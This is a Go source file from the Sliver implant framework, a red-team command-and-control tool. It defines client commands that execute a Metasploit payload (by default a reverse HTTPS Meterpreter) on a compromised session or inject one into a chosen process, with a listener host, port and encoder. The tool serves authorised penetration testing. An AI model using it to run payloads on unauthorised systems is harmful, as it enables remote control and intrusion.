package commands

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	consts "github.com/bishopfox/sliver/client/constants"
	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// MSFOptions - Options applying to all msf-related execution commands.
type MSFOptions struct {
	Payload    string `long:"payload" description:"payload type (auto-completed)" default:"meterpreter_reverse_https" value-name:"compatible payloads"`
	LHost      string `long:"lhost" description:"listen host" required:"yes"`
	LPort      int    `long:"lport" description:"listen port" default:"4444"`
	Encoder    string `long:"encoder" description:"MSF encoder" value-name:"msf encoders"`
	Iterations int    `long:"iterations" description:"iterations of the encoder" default:"1"`
}

// MSF - Execute an MSF payload in the current process.
type MSF struct {
	MSFOptions `group:"msf options"`
}

// Execute - Execute an MSF payload in the current process.
func (m *MSF) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	payloadName := m.Payload
	lhost := m.LHost
	lport := m.LPort
	encoder := m.Encoder
	iterations := m.Iterations

	if lhost == "" {
		fmt.Printf(util.Error+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf(util.Info+"Sending payload %s %s/%s -> %s:%d ...",
		payloadName, session.OS, session.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	_, err = transport.RPC.Msf(context.Background(), &clientpb.MSFReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		Request:    ContextRequest(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"%s\n", err)
	} else {
		fmt.Printf(util.Info + "Executed payload on target\n")
	}
	return nil
}

// MSFInject - Inject an MSF payload into a process.
type MSFInject struct {
	Positional struct {
		PID uint32 `description:"process ID to inject into" required:"1-1"`
	} `positional-args:"yes" required:"yes"`
	MSFOptions `group:"msf options"`
}

// Execute - Inject an MSF payload into a process.
func (m *MSFInject) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	payloadName := m.Payload
	lhost := m.LHost
	lport := m.LPort
	encoder := m.Encoder
	iterations := m.Iterations

	if lhost == "" {
		fmt.Printf(util.Error+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, session.OS, session.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	_, err = transport.RPC.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        m.Positional.PID,
		Request:    ContextRequest(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"%s\n", err)
	} else {
		fmt.Printf(util.Info + "Executed payload on target\n")
	}
	return nil
}
